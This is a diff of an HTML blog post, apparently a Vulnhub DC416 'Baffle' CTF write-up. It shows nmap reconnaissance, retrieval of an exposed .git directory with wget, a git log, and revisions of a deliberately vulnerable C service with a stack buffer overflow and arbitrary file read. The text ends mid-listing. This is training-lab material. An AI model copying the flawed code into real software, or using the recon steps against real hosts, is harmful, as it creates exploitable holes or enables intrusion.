@@ -1,491 +1,570 @@
-<!doctype html>
-<html lang="en" prefix="og: http://ogp.me/ns#">
-
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Vulnhub - DC416: Baffle Writeup</title>
-  <meta name="description"
-    content="Vulnhub - DC416: Baffle Writeup">
   
-  <meta name="keywords" content="vulnhub, walkthrough, writeup, DC416, baffle">
+    <title>Vulnhub - DC416: Baffle Writeup :: firefart</title>
   
-  <meta name="author" content="Christian Mehlmauer">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Vulnhub - DC416: Baffle Writeup" />
+<meta name="keywords" content="vulnhub, walkthrough, writeup, DC416, baffle" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://firefart.at/post/vulnhub_dc416_baffle/" />
 
-  <meta name="twitter:card" content="summary">
-  
-  <meta name="twitter:site" content="@firefart" />
-  <meta name="twitter:creator" content="@firefart" />
-  
-  <meta name="twitter:title" content="Vulnhub - DC416: Baffle Writeup">
-  <meta name="twitter:description"
-    content="Vulnhub - DC416: Baffle Writeup">
-  <meta property="og:title" content="Vulnhub - DC416: Baffle Writeup">
-  <meta property="og:type" content="article">
-  <meta property="og:url" content="https://firefart.at/post/vulnhub_dc416_baffle/" />
-  <meta property="og:description"
-    content="Vulnhub - DC416: Baffle Writeup">
-  
-  <meta property="og:image" content="https://firefart.at/img/misc/vulnhub.png" />
-  <meta name="twitter:image" content="https://firefart.at/img/misc/vulnhub.png" />
-  
-  <meta property="og:updated_time" content="2017-01-02 22:00:00 &#43;0100 CET" />
-  <meta property="article:author" content="https://twitter.com/firefart" />
 
-  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700%7COxygen:400,700" rel="stylesheet"
-    type="text/css">
-  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/pure-min.css">
-  <link rel="stylesheet" href="https://yui-s.yahooapis.com/pure/0.6.0/grids-responsive-min.css">
 
-  <link rel="stylesheet" href='https://firefart.at/css/all.css'>
-  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
+
+
 
   
   
-  <script type="application/ld+json">
-    [{
-        "@context": "http://schema.org",
-        "@type": "WebSite",
-        "name": "firefart",
-        "url": "https://firefart.at"
-      },
-      {
-        "@context": "http://schema.org",
-        "@type": "Person",
-        "name": "Christian Mehlmauer",
-        "url": "https://firefart.at",
-        "sameAs": [
-          "https://twitter.com/firefart",
-          "https://github.com/firefart",
-          "https://www.linkedin.com/in/firefart/"
-        ]
-      }
-    ]
-  </script>
+  
+  
+  
+  <link rel="stylesheet" href="/style.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://firefart.at/img/favicon.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://firefart.at" />
+  
+    <meta name="twitter:creator" content="firefart" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Vulnhub - DC416: Baffle Writeup">
+<meta property="og:description" content="Vulnhub - DC416: Baffle Writeup" />
+<meta property="og:url" content="https://firefart.at/post/vulnhub_dc416_baffle/" />
+<meta property="og:site_name" content="firefart" />
+
+  
+    <meta property="og:image" content="https://firefart.at/img/favicon.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2017-01-02 22:00:00 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" src='https://firefart.at/js/firefart.js' defer></script>
+
+<script type="application/ld+json">
+  [{
+      "@context": "http://schema.org",
+      "@type": "WebSite",
+      "name": "firefart",
+      "url": "https://firefart.at"
+    },
+    {
+      "@context": "http://schema.org",
+      "@type": "Person",
+      "name": "Christian Mehlmauer",
+      "url": "https://firefart.at",
+      "sameAs": [
+        "https://twitter.com/firefart",
+        "https://github.com/firefart",
+        "https://www.linkedin.com/in/firefart/"
+      ]
+    }
+  ]
+</script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-N88XDVDDZ7"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-N88XDVDDZ7');
+</script>
+
+
 
 </head>
+<body class="blue">
 
-<body>
 
-<div id="layout" class="pure-g">
-    <div class="sidebar pure-u-1 pure-u-md-1-4">
-    <div class="header">
-        <h1 class="brand-title"><a href="/">firefart</a></h1>
-        <h2 class="brand-tagline"> that austrian security guy </h2>
+<div class="container center headings--one-size">
 
-        <nav class="nav">
-            <ul class="nav-list">
-                
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href="https://twitter.com/firefart">
-                        <i class="fa fa-twitter"></i> Twitter
-                    </a>
-                </li>
-                
-                
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href="https://github.com/firefart">
-                        <i class="fa fa-github-alt"></i> Github
-                    </a>
-                </li>
-                
-                
-                
-                <li class="nav-item">
-                    <a class="pure-button" href="/page/about/"><i class="fa fa-info"></i> about me</a>
-                </li>
-                <li class="nav-item">
-                    <a class="pure-button" target="_blank" href='https://firefart.at/index.xml'>
-                        <i class="fa fa-rss"></i> rss
-                    </a>
-                </li>
-            </ul>
-        </nav>
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    firefart | that austrian security guy
+  </div>
+</a>
+
     </div>
-</div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu hidden-on-mobile">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://github.com/firefart">Github</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/firefart/">LinkedIn</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/firefart">Twitter</a></li>
+        
+      
+    
+  </ul>
+  <span class="spacer"></span>
+  <ul class="menu__inner menu__inner--desktop">
+    
+  </ul>
 
-    <div class="content pure-u-1 pure-u-md-3-4">
-        <div>
-            
-            <div class="posts">
-                <h1 class="content-subhead">02 Jan 2017, 22:00</h1>
-                <section class="post">
-                    <header class="post-header">
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://github.com/firefart">Github</a></li>
+      
+    
+      
+        <li><a href="https://www.linkedin.com/in/firefart/">LinkedIn</a></li>
+      
+    
+      
+        <li><a href="https://twitter.com/firefart">Twitter</a></li>
+      
+    
+    
+  </ul>
+</nav>
 
-                        <a href="/post/vulnhub_dc416_baffle/" class="post-title">Vulnhub - DC416: Baffle Writeup</a>
+  
+</header>
 
-                        <p class="post-meta">
-                            
-                            
-                        </p>
-                    </header>
 
-                    
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://firefart.at/post/vulnhub_dc416_baffle/">Vulnhub - DC416: Baffle Writeup</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        2017-01-02 ::
+        
+      </time>
+    
+    
+      <span class="post-author">Christian Mehlmauer</span>
+    
+    
+  </div>
 
-                    <div class="post-description">
-                        <p>After I finished <a href="/post/vulnhub_dc416_basement/">DC416 - Basement</a> I wanted to give the next VM a try: <a href="https://www.vulnhub.com/entry/dc416-2016,168/">DC416 - baffle</a> by <a href="https://twitter.com/superkojiman">@superkojiman</a>.</p>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>After I finished <a href="/post/vulnhub_dc416_basement/">DC416 - Basement</a> I wanted to give the next VM a try: <a href="https://www.vulnhub.com/entry/dc416-2016,168/">DC416 - baffle</a> by <a href="https://twitter.com/superkojiman">@superkojiman</a>.</p>
 <p>Here are my other writeups for the DC416 challenges:</p>
 <ul>
 <li><a href="/post/vulnhub_dc416_basement/">DC416 Basement</a></li>
 <li><a href="/post/vulnhub_dc416_dick_dastardly/">DC416 Dick Dastardly</a></li>
 <li><a href="/post/vulnhub_dc416_fortress/">DC416 Fortress</a></li>
 </ul>
-<h1 id="information-gathering">Information Gathering</h1>
+<h2 id="information-gathering">Information Gathering<a href="#information-gathering" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>As always I started with a <code>netdiscover</code> to get the machines IP-Address and viewed the instructions on Port 80 in a browser.</p>
-<pre tabindex="0"><code>Engagement Rules:
-    No username/password bruteforcing is necessary
-    This box has 5 flags
-    Flags are in FLAG{} format
-    The goal is not to get root. Get the flags and move on
-    Have fun
-</code></pre><p>So let&rsquo;s get the party started</p>
-<pre tabindex="0"><code>root@kali:~/baffle# nmap -sSV -T4 -A -p- 192.168.56.2
-
-Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-02 21:08 CET
-Nmap scan report for 192.168.56.2
-Host is up (0.00047s latency).
-Not shown: 65532 closed ports
-PORT     STATE SERVICE  VERSION
-22/tcp   open  ssh      OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
-| ssh-hostkey:
-|   1024 34:b3:3e:f7:50:91:51:6f:0b:e2:35:7b:d1:34:a1:eb (DSA)
-|   2048 b9:a9:a8:bc:db:7d:77:e4:ae:31:1c:16:4f:3b:8b:de (RSA)
-|_  256 88:3f:60:bb:9e:49:53:e3:f7:bb:30:84:7f:a8:f0:17 (ECDSA)
-80/tcp   open  http     nginx 1.6.2
-| http-git:
-|   192.168.56.2:80/.git/
-|     Git repository found!
-|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
-|_    Last commit message: Trashed my code, but deployed the product anyway.
-|_http-server-header: nginx/1.6.2
-|_http-title: baffle
-6969/tcp open  acmsoda?
-MAC Address: 08:00:27:84:83:C3 (Oracle VirtualBox virtual NIC)
-Device type: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.6
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre><h1 id="alice">alice</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Engagement Rules:
+</span></span><span style="display:flex;"><span>    No username/password bruteforcing is necessary
+</span></span><span style="display:flex;"><span>    This box has 5 flags
+</span></span><span style="display:flex;"><span>    Flags are in FLAG{} format
+</span></span><span style="display:flex;"><span>    The goal is not to get root. Get the flags and move on
+</span></span><span style="display:flex;"><span>    Have fun
+</span></span></code></pre></div><p>So let&rsquo;s get the party started</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/baffle# nmap -sSV -T4 -A -p- 192.168.56.2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.40 ( https://nmap.org ) at 2017-01-02 21:08 CET
+</span></span><span style="display:flex;"><span>Nmap scan report for 192.168.56.2
+</span></span><span style="display:flex;"><span>Host is up (0.00047s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65532 closed ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh      OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   1024 34:b3:3e:f7:50:91:51:6f:0b:e2:35:7b:d1:34:a1:eb (DSA)
+</span></span><span style="display:flex;"><span>|   2048 b9:a9:a8:bc:db:7d:77:e4:ae:31:1c:16:4f:3b:8b:de (RSA)
+</span></span><span style="display:flex;"><span>|_  256 88:3f:60:bb:9e:49:53:e3:f7:bb:30:84:7f:a8:f0:17 (ECDSA)
+</span></span><span style="display:flex;"><span>80/tcp   open  http     nginx 1.6.2
+</span></span><span style="display:flex;"><span>| http-git:
+</span></span><span style="display:flex;"><span>|   192.168.56.2:80/.git/
+</span></span><span style="display:flex;"><span>|     Git repository found!
+</span></span><span style="display:flex;"><span>|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
+</span></span><span style="display:flex;"><span>|_    Last commit message: Trashed my code, but deployed the product anyway.
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.6.2
+</span></span><span style="display:flex;"><span>|_http-title: baffle
+</span></span><span style="display:flex;"><span>6969/tcp open  acmsoda?
+</span></span><span style="display:flex;"><span>MAC Address: 08:00:27:84:83:C3 (Oracle VirtualBox virtual NIC)
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Linux 3.X|4.X
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+</span></span><span style="display:flex;"><span>OS details: Linux 3.2 - 4.6
+</span></span><span style="display:flex;"><span>Network Distance: 1 hop
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h2 id="alice">alice<a href="#alice" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Nmap found a <code>.git</code> directory in the webroot with directory listing enabled. This allows us to easily retreive the contents using wget</p>
-<pre tabindex="0"><code>wget -r --no-parent http://192.168.56.2/.git/
-</code></pre><p>Now we are able to operate with git on the directory:</p>
-<pre tabindex="0"><code>root@kali:~/baffle# cd 192.168.56.2/
-root@kali:~/baffle/192.168.56.2# git status
-On branch master
-Changes not staged for commit:
-  (use &#34;git add/rm &lt;file&gt;...&#34; to update what will be committed)
-  (use &#34;git checkout -- &lt;file&gt;...&#34; to discard changes in working directory)
-
-	deleted:    hellofriend.c
-
-no changes added to commit (use &#34;git add&#34; and/or &#34;git commit -a&#34;)
-</code></pre><p>And here is the commit history:</p>
-<pre tabindex="0"><code>root@kali:~/baffle/192.168.56.2# git log
-commit 8bde72465957415c12ab6f89ff679f8f9e7c5c7a
-Author: alice &lt;alice@baffle.me&gt;
-Date:   Mon Oct 17 14:58:02 2016 -0400
-
-    Trashed my code, but deployed the product anyway.
-
-commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
-Author: alice &lt;alice@baffle.me&gt;
-Date:   Mon Oct 17 14:55:07 2016 -0400
-
-    Some assembly required
-
-commit 9b5c226d15d611d6957f3fda7c993186270a6cc4
-Author: alice &lt;alice@baffle.me&gt;
-Date:   Mon Oct 17 14:52:40 2016 -0400
-
-    Made it into a write-type-thing instead
-
-commit 06483346fab91b2b17471074a887ac7dffd9ceda
-Author: alice &lt;alice@baffle.me&gt;
-Date:   Mon Oct 17 14:44:25 2016 -0400
-
-    My cat danced on the keyboard
-
-commit 7edc47a1c3e4dc880a7191915bdbf1565c6b7441
-Author: alice &lt;alice@baffle.me&gt;
-Date:   Mon Oct 17 14:37:14 2016 -0400
-
-    This coder turned coffee into code. You won&#39;t believe how she did it!
-
-commit d7a1f067a2f4ac469bc4cf77c689a34e2286b665
-Author: alice &lt;alice@baffle.me&gt;
-Date:   Mon Oct 17 14:30:20 2016 -0400
-
-    Hello, friend...
-</code></pre><p>Viewing the files on every commit by <code>git checkout HASH</code> we can extract the following revisions of <code>hellofriend.c</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>wget -r --no-parent http://192.168.56.2/.git/
+</span></span></code></pre></div><p>Now we are able to operate with git on the directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/baffle# cd 192.168.56.2/
+</span></span><span style="display:flex;"><span>root@kali:~/baffle/192.168.56.2# git status
+</span></span><span style="display:flex;"><span>On branch master
+</span></span><span style="display:flex;"><span>Changes not staged for commit:
+</span></span><span style="display:flex;"><span>  (use &#34;git add/rm &lt;file&gt;...&#34; to update what will be committed)
+</span></span><span style="display:flex;"><span>  (use &#34;git checkout -- &lt;file&gt;...&#34; to discard changes in working directory)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    deleted:    hellofriend.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>no changes added to commit (use &#34;git add&#34; and/or &#34;git commit -a&#34;)
+</span></span></code></pre></div><p>And here is the commit history:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>root@kali:~/baffle/192.168.56.2# git log
+</span></span><span style="display:flex;"><span>commit 8bde72465957415c12ab6f89ff679f8f9e7c5c7a
+</span></span><span style="display:flex;"><span>Author: alice &lt;alice@baffle.me&gt;
+</span></span><span style="display:flex;"><span>Date:   Mon Oct 17 14:58:02 2016 -0400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Trashed my code, but deployed the product anyway.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
+</span></span><span style="display:flex;"><span>Author: alice &lt;alice@baffle.me&gt;
+</span></span><span style="display:flex;"><span>Date:   Mon Oct 17 14:55:07 2016 -0400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Some assembly required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit 9b5c226d15d611d6957f3fda7c993186270a6cc4
+</span></span><span style="display:flex;"><span>Author: alice &lt;alice@baffle.me&gt;
+</span></span><span style="display:flex;"><span>Date:   Mon Oct 17 14:52:40 2016 -0400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Made it into a write-type-thing instead
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit 06483346fab91b2b17471074a887ac7dffd9ceda
+</span></span><span style="display:flex;"><span>Author: alice &lt;alice@baffle.me&gt;
+</span></span><span style="display:flex;"><span>Date:   Mon Oct 17 14:44:25 2016 -0400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    My cat danced on the keyboard
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit 7edc47a1c3e4dc880a7191915bdbf1565c6b7441
+</span></span><span style="display:flex;"><span>Author: alice &lt;alice@baffle.me&gt;
+</span></span><span style="display:flex;"><span>Date:   Mon Oct 17 14:37:14 2016 -0400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    This coder turned coffee into code. You won&#39;t believe how she did it!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit d7a1f067a2f4ac469bc4cf77c689a34e2286b665
+</span></span><span style="display:flex;"><span>Author: alice &lt;alice@baffle.me&gt;
+</span></span><span style="display:flex;"><span>Date:   Mon Oct 17 14:30:20 2016 -0400
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Hello, friend...
+</span></span></code></pre></div><p>Viewing the files on every commit by <code>git checkout HASH</code> we can extract the following revisions of <code>hellofriend.c</code>:</p>
 <p><strong>d7a1f067a2f4ac469bc4cf77c689a34e2286b665</strong></p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-
-int parse_request(char *req, int n) {
-    return 0;
-}
-
-
-
-int main(int argc, char *argv[]) {
-    char buf[2000];
-    int n;
-
-    setbuf(stdout, 0);
-
-    memset(buf, 0, sizeof(buf));
-    n = read(0, buf, sizeof(buf));
-    parse_request(buf, n);
-
-    return 0;
-}
-</code></pre><p><strong>7edc47a1c3e4dc880a7191915bdbf1565c6b7441</strong></p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-
-int parse_request(char *req, int n) {
-    char file[500];
-    char file_content[500];
-    int file_len;
-    char *ptr = req;
-    FILE *fp;
-
-    memset(file, 0, sizeof(file));
-
-    ptr = (char *)ptr + 2;
-    file_len = n - 2 - 5 - 2;
-    memcpy(file, ptr, file_len);
-
-    fp = fopen(file, &#34;r&#34;);
-    if (fp) {
-        memset(file_content, 0, sizeof(file_content));
-        fgets(file_content, sizeof(file_content), fp);
-        printf(&#34;%s&#34;, file_content);
-    }
-    return 0;
-}
-
-int main(int argc, char *argv[]) {
-    char buf[2000];
-    int n;
-
-    setbuf(stdout, 0);
-
-    memset(buf, 0, sizeof(buf));
-    n = read(0, buf, sizeof(buf));
-    parse_request(buf, n);
-
-    return 0;
-}
-</code></pre><p><strong>06483346fab91b2b17471074a887ac7dffd9ceda</strong></p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-
-int parse_request(char *req, int n) {
-    char file[500];
-    char file_content[500];
-    int file_len;
-    char *ptr = req;
-    FILE *fp;
-
-    memset(file, 0, sizeof(file));
-
-    ptr = (char *)ptr + 2;
-    FiLe_len = n - 2 - 5 - 2;
-    memcpy(file, ptr, file_len);
-
-    fp = fopen(file, &#34;r&#34;);
-    if (fp) {
-        memset(file_content, 0, sizeof(file_content));
-        fgets(file_content, sizeof(file_content), fp);
-        printf(&#34;%s&#34;, file_content);
-    }
-    return 0;
-}
-
-int mAin(int arGc, char *argv[]) {
-    char buf[2000];
-    int n;
-
-    setbuf(stdout, 0);
-
-    memset(buf, 0, sizeof(buf));
-    n = read(0, buf, sizeof(buf));
-    p{ARSE_REQUEST}(buf, n);
-
-    return 0;
-}
-</code></pre><p><strong>9b5c226d15d611d6957f3fda7c993186270a6cc4</strong></p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-
-char to_write[500];
-
-int parse_request(char *req, int n) {
-    char data[500];
-    char file[500];
-    char file_content[500];
-    int file_len;
-    int req_type;
-    char mode[10];
-    char *ptr = req;
-    FILE *fp;
-
-    memset(file, 0, sizeof(file));
-    memset(mode, 0, sizeof(mode));
-
-    memset(data, 0, sizeof(data));
-    memset(to_write, 0, sizeof(to_write));
-
-    ptr = (char *)ptr + 2;
-    file_len = strlen(ptr);
-
-    ptr = (char *)ptr + file_len + 1;
-    ptr = (char *)ptr + 6;
-
-    memcpy(to_write, ptr, 500);
-    memcpy(data, ptr, 2000);
-
-    return 0;
-}
-
-int main(int argc, char *argv[]) {
-    char buf[2000];
-    int n;
-
-    setbuf(stdout, 0);
-
-    memset(buf, 0, sizeof(buf));
-    n = read(0, buf, sizeof(buf));
-    parse_request(buf, n);
-
-    return 0;
-}
-</code></pre><p><strong>d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca</strong></p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-
-char to_write[500];
-
-int parse_request(char *req, int n) {
-    char data[500];
-    char file[500];
-    char file_content[500];
-    int file_len;
-    int req_type;
-    char mode[10];
-    char *ptr = req;
-    FILE *fp;
-
-    memset(file, 0, sizeof(file));
-    memset(mode, 0, sizeof(mode));
-
-    memset(data, 0, sizeof(data));
-    memset(to_write, 0, sizeof(to_write));
-
-    ptr = (char *)ptr + 2;
-    file_len = strlen(ptr);
-
-    ptr = (char *)ptr + file_len + 1;
-    ptr = (char *)ptr + 6;
-
-    memcpy(to_write, ptr, 500);
-    memcpy(data, ptr, 2000);
-
-    return 0;
-}
-
-int main(int argc, char *argv[]) {
-    char buf[2000];
-    int n;
-
-    setbuf(stdout, 0);
-
-    memset(buf, 0, sizeof(buf));
-    n = read(0, buf, sizeof(buf));
-    parse_request(buf, n);
-
-    return 0;
-}
-</code></pre><p><strong>8bde72465957415c12ab6f89ff679f8f9e7c5c7a</strong></p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-
-char to_write[500];
-
-int parse_request(char *req, int n) {
-    char data[500];
-    char file[500];
-    char file_content[500];
-    int file_len;
-    int req_type;
-    char mode[10];
-    char *ptr = req;
-    FILE *fp;
-
-    if (req_type == 0x01) {
-        /* todo */
-    }
-    if (req_type == 0x2) {
-        /* todo */
-    }
-    return 0;
-}
-
-int main(int argc, char *argv[]) {
-    char buf[2000];
-    int n;
-
-    setbuf(stdout, 0);
-
-    memset(buf, 0, sizeof(buf));
-    n = read(0, buf, sizeof(buf));
-    parse_request(buf, n);
-
-    return 0;
-}
-</code></pre><p>By looking at the commit log using <code>git log -p</code> we can also see a file called <code>project.enc</code> which was deleted in later commits but more on this later.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;string.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;unistd.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int parse_request(char *req, int n) {
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int main(int argc, char *argv[]) {
+</span></span><span style="display:flex;"><span>    char buf[2000];
+</span></span><span style="display:flex;"><span>    int n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    setbuf(stdout, 0);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(buf, 0, sizeof(buf));
+</span></span><span style="display:flex;"><span>    n = read(0, buf, sizeof(buf));
+</span></span><span style="display:flex;"><span>    parse_request(buf, n);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>7edc47a1c3e4dc880a7191915bdbf1565c6b7441</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;string.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;unistd.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int parse_request(char *req, int n) {
+</span></span><span style="display:flex;"><span>    char file[500];
+</span></span><span style="display:flex;"><span>    char file_content[500];
+</span></span><span style="display:flex;"><span>    int file_len;
+</span></span><span style="display:flex;"><span>    char *ptr = req;
+</span></span><span style="display:flex;"><span>    FILE *fp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(file, 0, sizeof(file));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ptr = (char *)ptr + 2;
+</span></span><span style="display:flex;"><span>    file_len = n - 2 - 5 - 2;
+</span></span><span style="display:flex;"><span>    memcpy(file, ptr, file_len);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fp = fopen(file, &#34;r&#34;);
+</span></span><span style="display:flex;"><span>    if (fp) {
+</span></span><span style="display:flex;"><span>        memset(file_content, 0, sizeof(file_content));
+</span></span><span style="display:flex;"><span>        fgets(file_content, sizeof(file_content), fp);
+</span></span><span style="display:flex;"><span>        printf(&#34;%s&#34;, file_content);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int main(int argc, char *argv[]) {
+</span></span><span style="display:flex;"><span>    char buf[2000];
+</span></span><span style="display:flex;"><span>    int n;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    setbuf(stdout, 0);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(buf, 0, sizeof(buf));
+</span></span><span style="display:flex;"><span>    n = read(0, buf, sizeof(buf));
+</span></span><span style="display:flex;"><span>    parse_request(buf, n);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    return 0;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>06483346fab91b2b17471074a887ac7dffd9ceda</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>#include &lt;stdio.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;string.h&gt;
+</span></span><span style="display:flex;"><span>#include &lt;unistd.h&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int parse_request(char *req, int n) {
+</span></span><span style="display:flex;"><span>    char file[500];
+</span></span><span style="display:flex;"><span>    char file_content[500];
+</span></span><span style="display:flex;"><span>    int file_len;
+</span></span><span style="display:flex;"><span>    char *ptr = req;
+</span></span><span style="display:flex;"><span>    FILE *fp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(file, 0, sizeof(file));
+</span></span><span style="display:flex;"><span>
